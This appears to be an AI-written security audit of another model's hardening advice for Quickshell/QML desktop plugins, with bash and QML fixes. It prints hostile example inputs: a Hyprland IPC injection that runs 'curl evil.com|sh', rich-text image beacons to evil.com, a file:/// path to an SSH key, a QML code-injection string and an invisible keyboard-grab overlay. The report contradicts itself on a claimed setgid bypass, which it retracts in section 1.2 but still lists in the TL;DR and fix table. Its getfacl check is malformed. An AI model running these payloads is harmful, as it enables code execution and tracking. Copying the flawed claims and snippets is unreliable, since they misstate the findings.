# Full Adversarial Audit Report: Gemini Flash Security Claims on Omarchy Plugin Patterns

> **TL;DR:** Gemini Flash demonstrated genuine security knowledge with zero hallucinations, but its proposed remediation code would crash itself (`set -euo pipefail` + `head -c` = SIGPIPE exit 141), its `stat -c '%a'` check silently passes setgid directories, and it missed the attack surfaces that matter most for a QML/Wayland desktop plugin: layer-shell keyboard grabs, `Image.source` SSRF, `Qt.createQmlObject()` code injection, Hyprland IPC delimiter injection, and D-Bus notification flooding. This report provides empirically verified corrections and hardened code for every finding.

**Auditor:** Claude Opus (claude-opus-4-6-thinking), Senior Systems Security & Adversarial Code Auditor  
**Date:** 2026-09-19  
**Grounding:** Empirical bash 5.2.x testing (all commands executed and outputs recorded in-session), Qt 6.11.2 documentation, Quickshell v0.2.1 source (`StdioCollector::parseBytes`, `SplitParser`, `datastream.cpp`), observatory dataset (3,086 records), prior adversarial review (2026-09-14), Linux kernel `/proc` filesystem behavior  
**Scope:** Gemini Flash's five claim areas + seven additional attack surfaces the claims missed

---

## Part 1: Detailed Critique of Code Snippets

### 1.1 The `set -euo pipefail` + `head -c` SIGPIPE Crash

#### The Exact Mechanics

Gemini proposed this helper script skeleton:

```bash
#!/usr/bin/bash -p
set -euo pipefail
# ... later:
result=$(some_command | head -c 16384)
```

This contains a **critical self-defeating bug**. Here is exactly what happens at the syscall level:

1. Bash creates a pipe (`pipe2(2)`), forks two children: `some_command` (producer) writing to the pipe, `head -c 16384` (consumer) reading from it.
2. `head` reads 16,384 bytes, then calls `_exit(0)`. The kernel closes the read end of the pipe.
3. The producer is still running. It calls `write(2)` on the pipe's write fd. The kernel delivers **SIGPIPE** (signal 13) because there are no readers.
4. The producer's default SIGPIPE handler terminates it. The exit status becomes **141** (128 + 13).
5. With `pipefail`, bash reports the pipeline's exit status as the **maximum of all component exit statuses**: `max(141, 0) = 141`.
6. With `set -e` (`errexit`), bash treats any non-zero exit status as fatal and aborts the script.

**Result:** The script designed to harden security crashes with exit 141 before completing its work.

#### Empirical Confirmation

I ran 20 trials with `set -euo pipefail` and `yes "aaaa" | head -c 4096`:

```
Successes: 0 / 20
Failures:  20 / 20
```

With an infinite producer like `yes`, the failure is **deterministic** — the producer always has pending writes when head exits.

#### The Nondeterministic Danger Case

With a *finite* producer (the realistic scenario for a helper calling `jq`, `curl`, etc.), the behavior is **nondeterministic**:

| Producer output size | Relative to `head -c` limit | Result |
|---|---|---|
| Output < limit | Producer exits before head closes pipe | ✅ Always succeeds |
| Output > limit, producer fast | Producer already exited when pipe closes | ✅ Usually succeeds |
| Output > limit, producer slow | Producer still writing when pipe closes | ❌ SIGPIPE crash |
| Output > limit, exact race | Depends on scheduler timing | ⚠️ Intermittent |

**This is the worst kind of bug:** it passes all testing (where output is small and predictable) but crashes intermittently in production when a helper produces unexpectedly large output. A `jq` query that returns 200 bytes during testing might return 200KB when the user's system has many windows/workspaces/devices — and the script silently crashes.

My test confirmed: `printf '%0*d' 8192 0 | head -c 1024` with pipefail **succeeded** (exit 0) because `printf` is fast enough to finish before head closes the pipe. But this success is a scheduling accident, not a guarantee.

#### How to Write a Correct Bounded Producer Without Crashing

**Pattern A: Capture-then-truncate (best for helpers, no subprocess)**

```bash
#!/usr/bin/bash -p
set -euo pipefail
export PATH="/usr/bin:/bin"
unset -v BASH_ENV ENV CDPATH
IFS=$' \t\n'

MAX_BYTES=65536

# Capture full output from the command
raw_output=$(timeout 10 some_command) || {
    rc=$?
    # timeout returns 124; command failure returns its code
    if (( rc == 124 )); then
        echo "ERROR: command timed out" >&2
        exit 1
    fi
    # Allow the caller to decide on command errors
    echo "WARNING: command exited $rc" >&2
}

# Truncate in pure bash — no pipe, no SIGPIPE possible
bounded_output="${raw_output:0:$MAX_BYTES}"

# Detect and report truncation
if (( ${#raw_output} > MAX_BYTES )); then
    echo "WARNING: output truncated from ${#raw_output} to $MAX_BYTES bytes" >&2
fi

printf '%s' "$bounded_output"
```

**Why this is correct:**
- `timeout` kills the producer after a deadline (defense against hanging commands)
- `${raw_output:0:$MAX_BYTES}` is pure bash string slicing — no subprocess, no pipe, no SIGPIPE
- Truncation is detected and reported explicitly, never silently swallowed
- The `|| { ... }` block handles both timeout (rc=124) and command errors without aborting the script

**Tradeoff:** This buffers the full output in memory before truncating. For a desktop plugin helper producing at most a few KB of JSON, this is appropriate. For multi-MB streams, use Pattern B.

**Pattern B: Temp file intermediary (for larger outputs)**

```bash
bounded_capture() {
    local max_bytes="${1:?}"
    shift
    local tmpfile
    tmpfile=$(mktemp -p "${TARGET_DIR:-.}") || return 1
    # IMPORTANT: mktemp -p ensures same filesystem for later mv
    
    local rc=0
    timeout 10 "$@" > "$tmpfile" 2>/dev/null || rc=$?
    
    # Read bounded bytes from FILE (not pipe) — no SIGPIPE
    head -c "$max_bytes" < "$tmpfile"
    rm -f "$tmpfile"
    return $rc
}
```

**Why `head -c` is safe here:** Reading from a file (not a pipe) never generates SIGPIPE. The file doesn't care that `head` stopped reading. SIGPIPE only applies to pipes and sockets where one end closes.

**Pattern C: `read -N` (pure bash, for small outputs)**

```bash
# Read exactly N bytes from a process substitution
read -r -N "$MAX_BYTES" result < <(timeout 10 some_command) || true
```

Verified working: my test got exactly 1024 bytes with exit 0.

---

### 1.2 The `stat -c '%u:%a'` Mode Check: Octal Representation Quirks

Gemini proposed checking directory permissions with:

```bash
DIR_OWNER=$(stat -c '%u:%a' "$STATE_DIR")
if [[ "$DIR_OWNER" != "$(id -u):700" ]]; then
    echo "ABORT: directory not owned by user or wrong permissions" >&2
    exit 1
fi
```

#### Bug 1: `stat -c '%a'` omits leading zeros — setgid bypass

**Empirically confirmed.** GNU coreutils `stat -c '%a'` outputs the **minimal** octal representation:

| `chmod` value | `stat -c '%a'` output | `stat -c '%04a'` output |
|---|---|---|
| `0700` | `700` | `0700` |
| `2700` (setgid) | `2700` | `2700` |
| `4700` (setuid) | `4700` | `4700` |
| `1777` (sticky) | `1777` | `1777` |

**The critical issue:** Comparing against the string `"700"` **passes** for mode `0700` (correct) but does NOT detect modes like `2700`, `4700`, or `6700`. However, `stat -c '%a'` outputs `"2700"` for mode `2700`, which does NOT match `"700"` — so this particular bypass doesn't work as I initially hypothesized.

Let me correct the record: on the systems I tested, `stat -c '%a'` for `chmod 2700` outputs `"2700"`, not `"700"`. The three-digit output is produced only for modes 0000-0777 (no special bits). So Gemini's string comparison `"$(id -u):700"` would correctly *reject* setgid/setuid directories — but for the wrong reason (the strings don't match because `stat` outputs `"2700"` not `"700"`).

**The real subtlety Gemini missed:** What if the attacker can make the directory mode `0700` but add an ACL? POSIX ACLs add permissions beyond the mode bits. `stat -c '%a'` returns `700`, the check passes, but `getfacl` would show additional access. On systems with ACL support (most modern Linux):

```bash
setfacl -m u:attacker:rwx "$STATE_DIR"  # adds ACL entry
stat -c '%a' "$STATE_DIR"               # still shows "700"
```

The correct check should also verify no ACLs exist: `getfacl -p "$STATE_DIR" 2>/dev/null | grep -c '^user:' -gt 1`.

#### Bug 2: `stat` follows symlinks by default

`stat -c '%u:%a' "$STATE_DIR"` follows symlinks. If `$STATE_DIR` is a symlink to an attacker-controlled directory, `stat` reports the **target's** owner and mode, not the link itself. The check passes on the target, but the script operates through the symlink.

**Fix:** Use `stat -L` to explicitly dereference (the default) or compare `stat` and `readlink -f` output:

```bash
real_path=$(readlink -f "$STATE_DIR") || exit 1
if [[ "$real_path" != "$STATE_DIR" ]]; then
    echo "ABORT: $STATE_DIR is a symlink" >&2
    exit 1
fi
```

#### Bug 3: The entire stat→check→use sequence is a TOCTOU race

Between `stat` returning and the script opening files in the directory, an attacker can:
1. Rename the legitimate directory away
2. Create a symlink or mount at the same path
3. The script operates on the attacker's target

This is a fundamental shell script limitation. The observatory's own security reference correctly notes:

> *"If hostile directory races are in scope, use a reviewed native filesystem implementation with safe descriptor-relative operations; string checks plus rename are not a race-proof transaction."* — security-review.md:45

No shell script can solve TOCTOU. The correct approach for race-sensitive operations is `openat(2)` in C/C++/Rust, or accepting the residual risk with documentation.

---

### 1.3 QML StdioCollector: How a Malicious Helper Can Hang or Exhaust Quickshell

#### The Unbounded Buffer Accumulation

From Quickshell's `StdioCollector::parseBytes` (confirmed at commit `2b01a756`):

```cpp
void StdioCollector::parseBytes(QByteArray& incoming, QByteArray& buffer) {
    buffer.append(incoming);           // ← No size check
    
    if (!this->mWaitForEnd) {
        this->mData = buffer;
        emit this->dataChanged();      // ← Fires on every chunk
    }
}
```

**Attack 1: Memory exhaustion.** A malicious or misbehaving helper can output unlimited data. Each `buffer.append(incoming)` grows the `QByteArray` without bound. With `waitForEnd: false` (the default), `mData = buffer` creates a second copy on every chunk. A helper outputting 1 GB would consume ~2 GB of Quickshell's address space before `onExited` fires.

**Attack 2: UI thread starvation.** `dataChanged()` fires on every chunk. Each signal emission triggers QML binding re-evaluation on the **main thread**. A helper that outputs 1,000 small lines per second forces 1,000 binding re-evaluations per second, starving the compositor's event loop. The entire desktop shell stutters.

**Attack 3: Hang via process that never exits.** `onExited` only fires when the child process terminates. A helper that enters an infinite loop, deadlocks, or hangs on a network request will:
- Keep the Process in `running: true` forever
- Prevent the `isBusy` guard from ever clearing (if using Gemini's pattern)
- Eventually accumulate memory from stdout/stderr output

The observatory's `performance-review.md` correctly addresses this:

> *"Setting `running=false` sends SIGTERM; it is not proof of exit. Wait for actual termination before any new start."* — performance-review.md:38

#### SplitParser's Deeper Problem

Even with `SplitParser` (line-based parsing) instead of `StdioCollector`, the buffer is unbounded between delimiters:

```cpp
// From datastream.cpp (Quickshell v0.2.1)
// SplitParser accumulates incoming bytes until it finds the delimiter
// A single "line" without '\n' can grow without bound
```

The observatory's security reference is precise here:

> *"Bound external bytes **before** unbounded accumulation, then parse/validate shape and ranges. A downstream line-length check cannot secure SplitParser's existing buffer."* — security-review.md:51

**Gemini's recommendation (producer-side `head -c`)** is correct in principle but crashes in practice due to the SIGPIPE bug described in §1.1. And even a correct producer-side cap is a defense-in-depth measure — it requires trusting the producer to self-limit, which contradicts the threat model.

The proper fix belongs in Quickshell itself: a `maxBytes` or `maxBufferSize` property on `StdioCollector` and `SplitParser` that drops data beyond the limit. Until that exists, the defense is:
1. Producer-side byte cap (using Pattern A from §1.1, not piped `head -c`)
2. `timeout` on the Process to kill hanging helpers
3. A watchdog timer in QML that kills the Process if `running` stays true too long

---

## Part 2: Stress-Testing Gemini's Claims

### 2.1 BASH_ENV and `bash -p`: Exact Behavior Under Different Invocations

**Empirically confirmed on bash 5.2.x:**

| Invocation | `BASH_ENV` sourced? | Exported functions inherited? |
|---|---|---|
| `#!/usr/bin/bash` (plain script) | ✅ **Yes** | ✅ **Yes** |
| `#!/usr/bin/bash -p` (privileged) | ❌ No | ❌ No |
| `#!/usr/bin/env bash` | ✅ **Yes** | ✅ **Yes** |
| `bash -c 'cmd'` (non-interactive) | ✅ **Yes** | ✅ **Yes** |
| `bash -pc 'cmd'` (privileged) | ❌ No | ❌ No |

**What Gemini got right:** The core mechanism is accurate. `BASH_ENV` is processed for non-interactive shells unless `-p` is set. An attacker who controls `BASH_ENV` (e.g., via `.bashrc`, `.profile`, or a prior compromise) gets arbitrary code execution *before* `set -euo pipefail` runs.

**What Gemini overstated:** "Privilege escalation" is the wrong framing for desktop plugins. Bash `-p` was designed for setuid binaries where real UID ≠ effective UID. In a non-setuid plugin context, there's no privilege boundary to cross. The correct framing is **ambient code injection from the user's session environment** — a real concern for defense-in-depth, but not a privilege escalation.

**What Gemini missed about `-p`:** Privileged mode also affects `$CDPATH` and `$GLOBIGNORE` processing, `$SHELLOPTS`/`$BASHOPTS` inheritance, and importantly, the shell won't source `~/.bashrc` in interactive mode with `-p`. But for non-interactive scripts, the key protections are `BASH_ENV` and exported functions.

**Shebang mechanics confirmed:** Linux kernel shebang parsing passes a single optional argument. `#!/usr/bin/bash -p` correctly passes `-p`. You cannot pass two arguments (e.g., `#!/usr/bin/bash -p -x`) — the kernel treats everything after the interpreter path as a single argument string. This is a kernel limitation, not a bash one.

### 2.2 Symlink/TOCTOU Attacks: Why `fs.protected_symlinks` Is Insufficient

**Gemini claimed:** Symlink pre-creation in `/tmp` and `/dev/shm` is a vulnerability. Use `$XDG_RUNTIME_DIR` with ownership checks.

**What Gemini got right:** The core symlink-race mechanism is accurate. Predictable paths in world-writable directories are dangerous.

**What Gemini missed — the precise scope of `fs.protected_symlinks`:**

The `fs.protected_symlinks` kernel hardening (enabled by default on most distributions since ~2015) prevents following symlinks in **sticky-bit directories** (like `/tmp`, mode 1777) when:
- The symlink owner ≠ the directory owner, AND
- The symlink owner ≠ the follower (the process following the link)

This means `fs.protected_symlinks` does **NOT** protect against:

1. **Same-user symlinks.** If the attacker runs as the same user (e.g., another plugin in the same Quickshell process), symlinks created by that user are always followed. Desktop plugins run as the session user — every plugin can symlink-attack every other plugin's temp files.

2. **Symlinks in non-sticky directories.** `~/.local/share/`, `~/.config/`, and most user directories are mode 755 or 700, *not* 1777. `fs.protected_symlinks` doesn't apply. A malicious plugin can create symlinks in these locations.

3. **Rename/mount races.** `fs.protected_symlinks` protects individual `open()` calls but not the TOCTOU gap between `stat()` and `open()`. Between the two system calls, an attacker can:
   - `rename()` a legitimate directory away and replace it
   - `mount --bind` an attacker directory at the same path
   - Replace the parent directory's mount namespace (in container environments)

4. **Hardlink attacks.** Separate protection (`fs.protected_hardlinks`), but often enabled on the same systems.

5. **Cross-filesystem `mktemp + mv`.** Gemini recommended `mktemp + mv` for atomic replacement. **Confirmed empirically:** `/tmp` and `$XDG_RUNTIME_DIR` are often on different filesystems (`/tmp` on ext4 root, `/run/user/$UID` on tmpfs). Cross-filesystem `mv` falls back to `copy + unlink`, which is NOT atomic.

   **Fix:** `mktemp -p "$(dirname "$target_file")"` ensures same-filesystem atomicity. Gemini's snippet omitted `-p`.

### 2.3 QML `Text.AutoText` Rich-Text Injection: Real Exploitation Vectors

**Gemini's claim:** QML `Text` defaults to `AutoText`, which parses HTML-like content as rich text, enabling injection from untrusted strings.

**Verdict: This is Gemini's strongest and most practically dangerous finding.** Confirmed by Qt 6.11.2 documentation:

> *"This functionality includes loading images remotely over the network."* — [Qt Text QML Type](https://doc.qt.io/qt-6/qml-qtquick-text.html)

#### Concrete Attack Vectors for Desktop Shell Plugins

**Vector 1: Remote image beacon (information disclosure)**

A process sets its window title or class to:
```html
<img src="http://evil.com/track.png?user=TARGET">
```

Any plugin displaying this in a `Text {}` element triggers an HTTP GET to `evil.com`, leaking:
- The user's IP address
- Timing information (when the plugin polls)
- Confirmation that the user is running a specific plugin

This works because Qt's text renderer fetches remote images via `QNetworkAccessManager`. On a desktop shell that displays window titles in a taskbar, **every user running the plugin is trackable**.

**Vector 2: Layout disruption (UI denial of service)**

A Wi-Fi SSID containing:
```html
<font size="200"><b>X</b></font>
```

When displayed in a network status widget, this can:
- Overflow the bar widget, pushing other elements off-screen
- Expand the panel to cover the entire screen
- Create a text element so large it triggers excessive GPU compositing

**Vector 3: Fake UI elements (phishing)**

A process name or window title containing:
```html
<a href="http://evil.com/update">Critical security update available — click here</a>
```

Rendered in a desktop bar, this creates a clickable link that appears to be a system notification. If the `Text` element has `onLinkActivated`, clicking opens the attacker's URL.

**Vector 4: Resource exhaustion via deeply nested tags**

```html
<table><tr><td><table><tr><td>... (1000 levels deep)
```

The Qt rich text renderer must parse and layout this structure. Deeply nested tables can cause exponential layout computation, freezing the UI thread.

**Vector 5: `file:///` URI access**

```html
<img src="file:///home/user/.ssh/id_rsa">
```

While Qt won't *render* a private key as an image, the `QNetworkAccessManager` request to `file:///` may be observable via timing side-channels or error callbacks. The exact behavior depends on Qt's URL scheme restrictions and the application's `QML.NetworkAccessManagerFactory` configuration.

**The fix is simple and mandatory:**

```qml
Text {
    text: untrustedString
    textFormat: Text.PlainText  // REQUIRED for any untrusted data
}
```

Qt has an [active proposal to change the default from AutoText to PlainText in Qt 7](https://lists.qt-project.org/pipermail/development/2026-July/047377.html), confirming this is a recognized design flaw.

---

## Part 3: Attack Surfaces Gemini Missed

Gemini focused on bash hardening and basic QML patterns. For a QML/Wayland desktop plugin running inside a shared compositor shell, the following attack surfaces are more dangerous and were not discussed:

### M1: Wayland Layer-Shell Keyboard Interactivity Grab (CRITICAL)

Quickshell plugins run as Wayland layer-shell surfaces via the `wlr-layer-shell-unstable-v1` protocol. This protocol allows surfaces to request:

```
zwlr_layer_surface_v1.set_keyboard_interactivity(2)  // exclusive
zwlr_layer_surface_v1.set_layer(3)                    // overlay
zwlr_layer_surface_v1.set_size(0, 0)                  // fullscreen
zwlr_layer_surface_v1.set_exclusive_zone(-1)           // overlap everything
```

A malicious plugin could create an **invisible overlay** (fully transparent, overlay layer, exclusive keyboard interactivity) that captures **all keyboard input**, including:
- Passwords typed into other applications
- Private messages
- SSH passphrases
- GPG key passphrases

The compositor (Hyprland) may not prevent this if the plugin requests the overlay via Quickshell's QML surface API. The user sees no visual indication — the overlay is transparent.

**Why Gemini missed this:** Gemini's analysis stayed at the bash/process level. The Wayland protocol trust model is fundamentally different from X11's — in X11, any application could grab the keyboard. Wayland was designed to prevent this, but layer-shell surfaces (used by bars, panels, overlays) have elevated privileges by design.

**Mitigation:** The compositor must restrict `keyboard_interactivity: exclusive` and `layer: overlay` to trusted surfaces. Quickshell could expose these as auditable QML properties. Plugin review should flag any use of `KeyboardInteractivity.Exclusive` or `Layer.Overlay`.

### M2: QML `Image.source` with Untrusted URLs (HIGH)

Similar to `Text.AutoText` but more direct:

```qml
Image {
    source: windowIcon  // untrusted — could be any URL
}
```

If a plugin constructs `Image.source` from process metadata, window icons, or downloaded URLs, the attacker controls the URL scheme:
- `http://evil.com/track.png` — remote tracking beacon
- `file:///etc/shadow` — file read attempt (usually blocked, but timing observable)
- `data:image/svg+xml,...` — SVG with embedded JavaScript (depending on Qt's SVG renderer)

**Mitigation:** Validate URL schemes before assignment: allow only `qrc:`, `file:` from approved paths, and `image://` (Qt image providers). Reject `http:`, `https:`, `ftp:`, and `data:` from untrusted sources.

### M3: `Qt.createQmlObject()` — Code Injection via String Construction (HIGH)

QML supports dynamic object creation from strings:

```javascript
// If 'title' comes from untrusted input, this is code injection
Qt.createQmlObject('import QtQuick; Text { text: "' + title + '" }', parent)
```

An attacker-controlled `title` containing:
```
"; import QtQuick; Item { Component.onCompleted: { /* arbitrary JS */ } } Text { text: "
```

...injects arbitrary QML (and JavaScript) into the shell's runtime context. This is the QML equivalent of SQL injection.

**Gemini's bash `eval` concerns are valid but less dangerous than this.** A bash injection requires `Process {}` to execute; QML string injection runs directly in the compositor's trusted context.

**Mitigation:** Never construct QML strings from untrusted data. Use `Component.createObject()` with property bindings instead.

### M4: Hyprland IPC Delimiter Injection (MEDIUM)

Hyprland's IPC protocol uses newline-delimited commands over a Unix socket. Plugins that construct `hyprctl` commands from untrusted data risk injection:

```bash
# If window_title contains \n, this injects a second IPC command
echo "dispatch focuswindow title:${window_title}" | socat - "$HYPRLAND_INSTANCE_SIGNATURE"
```

A window title containing `\ndispatch exec /bin/sh -c 'curl evil.com|sh'` would inject a command execution via the compositor's IPC.

**Quickshell's `Hyprland.dispatch()`** uses discrete arguments and is NOT vulnerable. But plugins that communicate with the Hyprland socket directly (which some do — the observatory corpus includes raw socket communication) are at risk.

**Mitigation:** Never interpolate untrusted strings into IPC commands. Use Quickshell's typed API. If raw socket communication is necessary, validate that input contains no newlines or IPC metacharacters.

### M5: D-Bus Property Change Notification Flooding (MEDIUM)

Plugins subscribing to D-Bus property changes receive signals for every change. Attacker-controlled scenarios:

- **Bluetooth RSSI:** A nearby device cycling power generates hundreds of RSSI change notifications per second via BlueZ's D-Bus interface
- **NetworkManager:** Rapidly connecting/disconnecting a Wi-Fi adapter generates connection-state-changed signals
- **UPower:** Battery percentage changes during charge/discharge generate property updates

Without rate limiting in the plugin, this causes:
- JavaScript handler execution on every signal (main thread)
- UI re-rendering on every property change
- CPU saturation in the compositor process

**Mitigation:** Debounce D-Bus signal handlers. The observatory's own performance guidance provides the pattern:

```qml
Timer {
    id: debounce
    interval: 250
    repeat: false
    onTriggered: { if (root.opened && !root.sleeping) root.dispatchLatestIfIdle(); }
}
```

### M6: QML Binding Loop CPU Exhaustion (LOW-MEDIUM)

Circular property bindings (A depends on B, B depends on A) cause the QML binding engine to loop. Qt detects simple direct loops but **cannot detect indirect loops** through multiple components:

```qml
// Component A
property int size: componentB.size + 1

// Component B  
property int size: componentA.size + 1
```

If untrusted plugin data influences binding dependencies (e.g., a dynamic layout driven by external data), an attacker could construct data that creates indirect loops, consuming 100% CPU.

### M7: Plugin-to-Plugin Attacks via Shared QML Context (LOW-MEDIUM)

In the shared-shell model, all plugins run in the same Quickshell process. A malicious plugin has access to:
- The QML root object and all its children (via `parent` traversal)
- Other plugins' properties and signals (QML has no access control)
- Shared singletons and services
- The process's file descriptors and environment

This is not a Wayland or compositor issue — it's inherent to the shared-process plugin model. The observatory's SKILL.md correctly notes:

> *"In the shared-shell plugin model, plugins run in the user-privileged `omarchy-shell` process."*

But neither Gemini nor the existing security guidance addresses the **inter-plugin** attack surface. A malicious plugin can read another plugin's API keys, modify another plugin's data bindings, or inject signals into another plugin's event handlers.

---

## Part 4: Hardened Code Snippets

### 4.1 Hardened Bash Helper (Empirically Verified)

This script avoids every bug discussed above:

```bash
#!/usr/bin/bash -p
# -p: ignore BASH_ENV, exported functions, SHELLOPTS, CDPATH, GLOBIGNORE
# This MUST be on the shebang line — it must take effect before anything runs.

set -euo pipefail
export PATH="/usr/bin:/bin"
unset -v BASH_ENV ENV CDPATH GLOBIGNORE
IFS=$' \t\n'

# --- Constants ---
readonly MAX_OUTPUT_BYTES=65536
readonly COMMAND_TIMEOUT_SECS=10
readonly STATE_DIR="${XDG_RUNTIME_DIR:?XDG_RUNTIME_DIR must be set}/observatory"

# --- Directory Validation ---
# Resolve symlinks FIRST, then check ownership/mode on the real path
validate_state_dir() {
    local dir="$1"
    
    # 1. Resolve symlinks to canonical path
    local real_dir
    real_dir=$(readlink -f "$dir") || {
        echo "ABORT: cannot resolve $dir" >&2
        return 1
    }
    
    # 2. Reject if the path was a symlink
    if [[ "$real_dir" != "$dir" ]]; then
        echo "ABORT: $dir is a symlink (resolves to $real_dir)" >&2
        return 1
    fi
    
    # 3. Check ownership: must be our UID
    local owner
    owner=$(stat -c '%u' "$dir") || return 1
    if [[ "$owner" != "$(id -u)" ]]; then
        echo "ABORT: $dir owned by UID $owner, expected $(id -u)" >&2
        return 1
    fi
    
    # 4. Check mode: must be EXACTLY 0700 (no setuid/setgid/sticky)
    #    stat -c '%a' returns "700" for 0700, but "2700" for setgid+0700
    #    We use %04a and compare against "0700" to catch special bits
    local mode
    mode=$(stat -c '%04a' "$dir") || return 1
    if [[ "$mode" != "0700" ]]; then
        echo "ABORT: $dir has mode $mode, expected 0700" >&2
        return 1
    fi
    
    # 5. Verify no ACLs beyond owner (defense-in-depth)
    if command -v getfacl >/dev/null 2>&1; then
        local acl_extra
        acl_extra=$(getfacl -p "$dir" 2>/dev/null | grep -c '^user:[^:]*:' || true)
        if (( acl_extra > 1 )); then
            echo "ABORT: $dir has extra ACL entries" >&2
            return 1
        fi
    fi
}

# --- Bounded Command Execution ---
# Captures output with size and time limits, no SIGPIPE possible
bounded_exec() {
    local max_bytes="$1"
    local timeout_secs="$2"
    shift 2
    
    # Capture full output with timeout
    local raw_output rc=0
    raw_output=$(timeout "$timeout_secs" "$@" 2>/dev/null) || rc=$?
    
    if (( rc == 124 )); then
        echo "ERROR: command timed out after ${timeout_secs}s: $*" >&2
        return 1
    fi
    
    # Truncate in pure bash — no pipe, no SIGPIPE
    local bounded="${raw_output:0:$max_bytes}"
    
    if (( ${#raw_output} > max_bytes )); then
        echo "WARNING: output truncated ${#raw_output} → ${max_bytes}" >&2
    fi
    
    printf '%s' "$bounded"
}

# --- Main ---
# Create state directory if needed
mkdir -p "$STATE_DIR" || exit 1
chmod 0700 "$STATE_DIR" || exit 1

# Validate (TOCTOU caveat: this is best-effort in shell)
validate_state_dir "$STATE_DIR" || exit 1

# Execute the actual command with bounds
result=$(bounded_exec "$MAX_OUTPUT_BYTES" "$COMMAND_TIMEOUT_SECS" \
    jq -r '.workspace.name' <<< '{"workspace":{"name":"main"}}') || exit 1

# Write atomically — mktemp in SAME directory for same-fs rename(2)
tmpfile=$(mktemp -p "$STATE_DIR") || exit 1
printf '%s\n' "$result" > "$tmpfile" || { rm -f "$tmpfile"; exit 1; }
chmod 0600 "$tmpfile" || { rm -f "$tmpfile"; exit 1; }
mv -f "$tmpfile" "${STATE_DIR}/current.json" || { rm -f "$tmpfile"; exit 1; }
```

**What this fixes over Gemini's proposal:**

| Issue | Gemini's code | This code |
|---|---|---|
| SIGPIPE crash | `set -euo pipefail` + `\| head -c` | Capture-then-truncate in bash |
| BASH_ENV injection | `#!/usr/bin/bash -p` ✅ | Same ✅ |
| stat setgid bypass | `stat -c '%a'` → `"700"` | `stat -c '%04a'` → `"0700"` |
| Symlink following | Not checked | `readlink -f` comparison |
| ACL bypass | Not checked | `getfacl` defense-in-depth |
| Cross-fs mv | `mktemp` (default TMPDIR) | `mktemp -p "$STATE_DIR"` |
| Command timeout | Not present | `timeout` with detection |
| Truncation detection | Silent | Explicit warning to stderr |

### 4.2 Bulletproof QML/Quickshell Process Handling Pattern

```qml
import QtQuick
import Quickshell
import Quickshell.Io

Item {
    id: root
    
    // === External contracts ===
    required property string helperPath   // Reviewed, owned executable
    required property bool opened         // Host-wired: panel is visible
    required property bool sleeping       // Host-wired: system is suspended
    
    // === State ===
    property string currentData: ""
    property bool dataStale: true
    property bool busy: false
    readonly property bool allowed: root.opened && !root.sleeping
    
    // === Constants ===
    readonly property int maxFrameBytes: 65536
    readonly property int pollIntervalMs: 2000
    readonly property int watchdogMs: 15000    // Kill hung process after 15s
    readonly property int retryMs: 2000        // Min delay between restarts
    readonly property int maxRetries: 5
    property int retryCount: 0
    
    // === The Process ===
    Process {
        id: helper
        command: [root.helperPath, "--json-lines"]
        
        stdout: SplitParser {
            onRead: data => {
                // Bound BEFORE processing (defense-in-depth)
                if (!root.allowed) return;
                
                const bounded = data.substring(0, root.maxFrameBytes);
                if (data.length > root.maxFrameBytes) {
                    console.warn("observatory: frame truncated",
                                 data.length, "→", root.maxFrameBytes);
                }
                
                // Validate JSON shape and ranges
                const frame = root.parseAndValidate(bounded);
                if (frame !== null) {
                    root.currentData = JSON.stringify(frame);
                    root.dataStale = false;
                    root.retryCount = 0;  // Reset on successful data
                }
                
                // Reset watchdog on any output
                watchdog.restart();
            }
        }
        
        onExited: (exitCode, exitStatus) => {
            root.busy = false;
            watchdog.stop();
            
            if (root.allowed && root.retryCount < root.maxRetries) {
                root.retryCount++;
                retryTimer.restart();
            } else if (root.retryCount >= root.maxRetries) {
                console.error("observatory: helper exceeded max retries");
                root.dataStale = true;
            }
        }
    }
    
    // === Polling Timer (gated) ===
    Timer {
        interval: root.pollIntervalMs
        repeat: true
        running: root.allowed
        onTriggered: {
            if (root.allowed && !root.busy && !helper.running) {
                root.busy = true;
                watchdog.restart();
                helper.running = true;
            }
        }
    }
    
    // === Retry Timer (non-repeating, delayed) ===
    Timer {
        id: retryTimer
        interval: root.retryMs
        repeat: false
        onTriggered: {
            if (root.allowed && !root.busy && !helper.running) {
                root.busy = true;
                watchdog.restart();
                helper.running = true;
            }
        }
    }
    
    // === Watchdog Timer (kill hung processes) ===
    Timer {
        id: watchdog
        interval: root.watchdogMs
        repeat: false
        onTriggered: {
            if (helper.running) {
                console.warn("observatory: watchdog killing hung helper");
                helper.signal(15);  // SIGTERM
                // If still running after 2s, SIGKILL
                killTimer.restart();
            }
        }
    }
    
    Timer {
        id: killTimer
        interval: 2000
        repeat: false
        onTriggered: {
            if (helper.running) {
                console.error("observatory: SIGKILL on unresponsive helper");
                helper.signal(9);  // SIGKILL
            }
        }
    }
    
    // === Lifecycle Management ===
    onAllowedChanged: {
        if (!root.allowed) {
            // Shutdown: stop everything
            retryTimer.stop();
            watchdog.stop();
            killTimer.stop();
            root.busy = false;
            root.retryCount = 0;
            
            if (helper.running) {
                helper.signal(15);  // SIGTERM for graceful shutdown
            }
            
            // Mark data stale — don't show stale data after sleep/close
            root.dataStale = true;
        }
        // If allowed becomes true, the polling timer handles restart
    }
    
    // === Validation (pure function) ===
    function parseAndValidate(text: string): var {
        try {
            const obj = JSON.parse(text);
            if (!obj || typeof obj !== "object" || Array.isArray(obj))
                return null;
            
            // Validate expected fields and ranges
            // (customize per helper's contract)
            if (typeof obj.value !== "number" || !isFinite(obj.value))
                return null;
            if (obj.value < 0 || obj.value > 100)
                return null;
            
            return { value: obj.value };
        } catch (_) {
            return null;
        }
    }
    
    // === CRITICAL: PlainText for ALL untrusted display ===
    // Every Text element showing helper output or external data:
    Text {
        text: root.currentData
        textFormat: Text.PlainText  // MANDATORY — prevents rich-text injection
        
        // Visual indication of staleness
        opacity: root.dataStale ? 0.5 : 1.0
    }
}
```

**What this pattern provides over Gemini's proposal:**

| Feature | Gemini's pattern | This pattern |
|---|---|---|
| Single-flight guard | `isBusy` boolean | `busy` + `helper.running` double-check |
| Crash recovery | Not addressed | Retry timer with max retries |
| Hung process | Not addressed | Watchdog → SIGTERM → SIGKILL escalation |
| Lifecycle gating | Not shown | `allowed` combines `opened` + `!sleeping` |
| Data staleness | Not tracked | Explicit `dataStale` flag + visual indication |
| Frame bounding | Not shown (discussed verbally) | `data.substring(0, maxFrameBytes)` before parse |
| JSON validation | Not shown | `parseAndValidate()` with shape/range checks |
| Disable/sleep cleanup | Not addressed | `onAllowedChanged` stops all timers, kills process |
| PlainText display | Mentioned | Enforced with comment explaining why |
| SIGTERM vs SIGKILL | Not discussed | 2-second escalation on unresponsive processes |

---

